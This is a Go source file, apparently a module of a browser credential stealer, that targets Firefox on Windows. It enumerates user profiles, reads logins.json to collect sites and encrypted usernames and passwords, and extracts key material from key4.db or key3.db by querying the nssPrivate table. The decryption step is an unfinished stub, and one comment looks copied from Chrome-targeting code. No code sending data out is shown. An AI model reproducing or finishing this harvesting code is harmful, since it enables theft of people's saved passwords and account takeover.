package browsers

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"os"

	_ "github.com/mattn/go-sqlite3"
)

var  (
	FIREFOX_PROFILE_PATH = fmt.Sprintf("%s/Mozilla/Firefox/Profiles", APPDATA)
	NSS_PATH = fmt.Sprintf("%s/Mozilla Firefox", PROGRAMFILES)
	NSS_PATH_86 = fmt.Sprintf("%s (x86)/Mozilla Firefox", PROGRAMFILES)
	// RequiredFiles = []string{ "key3.db", "key4.db", "logins.json" }
)

func Firefox() BrowserConfig {
	credentials := BrowserConfig{
		Browser:     "firefox",
		Credentials: []Credential{},
	}

	// first, get the nss3.dll path
	// next, get the key3.db or key4.db file
	// next, get the logins.json file
	// next, parse the logins.json file
	// next, decrypt the password
	// next, add the credential to the credentials slice

	nssPath, err := getNSSDLL();
	if err != nil {
		fmt.Println(err.Error())
		return credentials
	}
	fmt.Println(nssPath)

	err = getMozLoginData(&credentials);
	if err != nil {
		fmt.Println(err.Error())
		return credentials
	}

	return credentials
}

func getMozLoginData(credentials *BrowserConfig) error {
	dirs, err := os.ReadDir(FIREFOX_PROFILE_PATH)
	if err != nil {
		fmt.Println(err.Error())
		return err
	}

	finalErr := fmt.Errorf("profile not found");
	for _, dir := range dirs {
		profilePath := fmt.Sprintf("%s/%s", FIREFOX_PROFILE_PATH, dir.Name())
		profileDir, err := os.ReadDir(profilePath)
		if err != nil {
			continue
		}
		
		for _, file := range profileDir {
			if file.Name() == "logins.json" {
				finalErr = nil;
				// nssDBArr, err := getNSSPrivate(profilePath);
				// if err != nil {
				// 	fmt.Println(err.Error())
				// 	return credentials
				// }

				// fmt.Println(nssDBArr)
				parseCredentials(profilePath, credentials);
				break;
			}
		}
	}
	return finalErr;
}

func getNSSDLL() (string, error) {	
	if _, err := os.Stat(NSS_PATH + "/nss3.dll"); err == nil {
		return NSS_PATH, nil;
	} else if _, err := os.Stat(NSS_PATH_86 + "/nss3.dll"); err == nil {
		return NSS_PATH_86, nil;
	} else {
		fmt.Println("Firefox not found");
		return "", fmt.Errorf("Firefox not found");
	}
}

func parseCredentials(profilePath string, credentials *BrowserConfig) {
	// Read the logins.json file
	loginsFile, err := os.ReadFile(fmt.Sprintf("%s/logins.json", profilePath))
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	// Parse the JSON from logins.json
	var loginsData map[string]interface{}
	if err := json.Unmarshal(loginsFile, &loginsData); err != nil {
		fmt.Println(err.Error())
		return
	}

	// Extract the encrypted_key from the Local State data
	logins, ok := loginsData["logins"].([]interface{})
	if !ok {
		fmt.Println("logins not found in logins.json")
		return
	}

	for _, login := range logins {
		loginData, ok := login.(map[string]interface{})
		if !ok {
			fmt.Println("login not found in logins.json")
			continue
		}

		// Extract the hostname
		url, _ := loginData["hostname"].(string)
		encryptedUsername, _ := loginData["encryptedUsername"].(string)
		encryptedPassword, _ := loginData["encryptedPassword"].(string)

		// Decrypt the username and password
		username, err := decryptMozData(encryptedUsername, profilePath)
		if err != nil {
			fmt.Println(err.Error())
		}

		password, err := decryptMozData(encryptedPassword, profilePath)
		if err != nil {
			fmt.Println(err.Error())
		}
		
		// Add the credential to the credentials slice
		credentials.Credentials = append(credentials.Credentials, Credential{
			URL:      url,
			Username: username,
			Password: password,
		})
	}


}


type nssPrivate struct {
	a11 string;
	a102 string;
}

func getNSSPrivate(path string) ([]nssPrivate, error) {
	var keyFile string;
	if _, err := os.Stat(path + "/key4.db"); err == nil {
		keyFile = path + "/key4.db";
	} else if _, err := os.Stat(path + "/key3.db"); err == nil {
		keyFile = path + "/key3.db";
	} else {
		return nil, fmt.Errorf("key file not found");
	}
	
	// create temp file
	tempFile, err := os.CreateTemp("", "firefox_key_*.db");
	if err != nil {
		fmt.Println(err.Error())
		return nil, err
	}
	defer os.Remove(tempFile.Name())

	// copy key file to temp file
	fileBytes, err := os.ReadFile(keyFile);
	if err != nil {
		fmt.Println(err.Error())
		return nil, err
	}
	err = os.WriteFile(tempFile.Name(), fileBytes, 0644);
	if err != nil {
		fmt.Println(err.Error())
	}

	// read sqlite3 database
	db, err := sql.Open("sqlite3", tempFile.Name());
	if err != nil {
		fmt.Println(err.Error())
		return nil, err
	}
	defer db.Close()

	// Ping the database
	err = db.Ping()
	if err != nil {
		fmt.Println(err.Error())
		return nil, err
	}

	// Query the database for content of nssPrivate
	rows, err := db.Query("SELECT a11, a102 FROM nssPrivate");
	if err != nil {
		fmt.Println(err.Error())
		return nil, err
	}

	// create list of objects for to store data
	var nssDBArr []nssPrivate;
	
	// Iterate over the rows
	for rows.Next() {
		var a11 string;
		var a102 string;

		err = rows.Scan(&a11, &a102);
		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		nssDBArr = append(nssDBArr, nssPrivate{
			a11: a11,
			a102: a102,
		})
	}

	return nssDBArr, nil
}

func decryptMozData(ciphertext string, profilePath string) (string, error) {
	if ciphertext == "" {
		return "", nil
	}

	return ciphertext, nil;
}